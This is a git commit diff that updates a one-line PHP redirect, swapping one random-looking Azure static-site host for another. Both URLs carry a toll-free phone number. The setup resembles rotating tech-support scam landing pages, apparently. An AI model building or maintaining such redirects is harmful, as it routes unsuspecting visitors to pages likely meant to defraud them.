9e16c040bc53fb3b47cd7f0a783c13fd6c096327
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-04 22:19:12 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://happy2be8shape9inxxxx.z12.web.core.windows.net/index.html?Aniph=1-833-443-3001");
+header("Location: https://be7unstopp7t3eble8daxxx.z48.web.core.windows.net/index.html?Aniph=1-833-443-3001");
 
 exit;
 ?>
